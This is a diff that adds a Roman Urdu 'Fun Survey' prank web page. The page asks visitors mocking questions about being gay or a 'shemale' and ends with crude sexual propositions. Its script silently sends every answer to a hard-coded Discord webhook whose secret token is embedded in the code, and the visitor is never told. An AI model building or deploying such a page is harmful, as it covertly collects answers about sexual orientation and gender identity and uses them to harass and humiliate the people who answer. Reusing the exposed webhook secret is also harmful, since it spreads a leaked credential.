@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun Survey</title>
+    <!-- Google Font (Poppins for clean modern typography) -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Subtle Background Patterns */
+        .bg-decor {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(230,230,250,0.8) 0%, rgba(255,255,255,0) 70%);
+            z-index: 0;
+        }
+        .bg-1 { top: -50px; left: -50px; }
+        .bg-2 { bottom: -50px; right: -50px; }
+
+        /* Card Container */
+        .card {
+            background: #ffffff;
+            border: 1px solid #eaeaea;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.06);
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            transition: all 0.4s ease;
+        }
+
+        .question-text {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 30px;
+            line-height: 1.4;
+            color: #111;
+            min-height: 75px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Button Styling */
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px 24px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+        }
+
+        .btn-yes {
+            background-color: #000000;
+            color: #ffffff;
+        }
+
+        .btn-yes:hover {
+            background-color: #222222;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.15);
+        }
+
+        .btn-no {
+            background-color: #f0f0f0;
+            color: #333333;
+        }
+
+        .btn-no:hover {
+            background-color: #e2e2e2;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.05);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        /* Fade Animation */
+        .fade-out {
+            opacity: 0;
+            transform: scale(0.95);
+        }
+        .fade-in {
+            opacity: 1;
+            transform: scale(1);
+        }
+        .transition-effect {
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-decor bg-1"></div>
+    <div class="bg-decor bg-2"></div>
+
+    <div class="card transition-effect" id="mainCard">
+        <div class="question-text" id="question">Kya ap gay ho🤡 🙃</div>
+        <div class="btn-group" id="btnGroup">
+            <button class="btn btn-yes" onclick="handleAnswer('Yes')">Yes</button>
+            <button class="btn btn-no" onclick="handleAnswer('No')">No</button>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566035973479989258/ic3_SmM7Z-J75xtbpjA3VEFMoybgGIUWMEyxBbrZca_AcwSM1VyKvJ2nAvIWD13J8En1";
+
+        const phases = [
+            {
+                question: "Kya ap gay ho🤡 🙃",
+                yesResult: "muje pahly hi Shaq tha🤡"
+            },
+            {
+                question: "Kya ap shemale ho🫣🤡",
+                yesResult: "ap se yahi umeed thi 🤧🙂"
+            },
+            {
+                question: "Kya apka koi thoku hy 🤣🙂",
+                yesResult: "muj nhi dii 🥺"
+            },
+            {
+                question: "Kya ma apka thoku ban Jaon 🤡🤧",
+                yesResult: "Kal tail chitai le kr ready rehna🙂",
+                noResult: "ma to apka hi thoku bano ga 🤭🤣"
+            }
+        ];
+
+        let currentPhase = 0;
+
+        function sendDiscordNotification(phaseIndex, answer) {
+            const payload = {
+                username: "Prank Website Bot",
+                embeds: [{
+                    title: "New Interaction!",
+                    color: answer === 'Yes' ? 65280 : 16711680,
+                    fields: [
+                        { name: "Question", value: phases[phaseIndex].question, inline: false },
+                        { name: "User Answered", value: `**${answer}**`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Webhook Error:", err));
+        }
+
+        function updateCardContent(htmlQuestion, showButtons = true) {
+            const card = document.getElementById("mainCard");
+            const qElem = document.getElementById("question");
+            const btnGroup = document.getElementById("btnGroup");
+
+            card.classList.add("fade-out");
+
+            setTimeout(() => {
+                qElem.innerHTML = htmlQuestion;
+                if (!showButtons) {
+                    btnGroup.style.display = "none";
+                }
+                card.classList.remove("fade-out");
+                card.classList.add("fade-in");
+            }, 300);
+        }
+
+        function handleAnswer(answer) {
+            sendDiscordNotification(currentPhase, answer);
+
+            if (answer === 'Yes') {
+                updateCardContent(phases[currentPhase].yesResult, false);
+            } else if (answer === 'No') {
+                if (currentPhase < phases.length - 1) {
+                    currentPhase++;
+                    updateCardContent(phases[currentPhase].question, true);
+                } else {
+                    updateCardContent(phases[currentPhase].noResult, false);
+                }
+            }
+        }
+    </script>
+</body>
+  </html>
+  
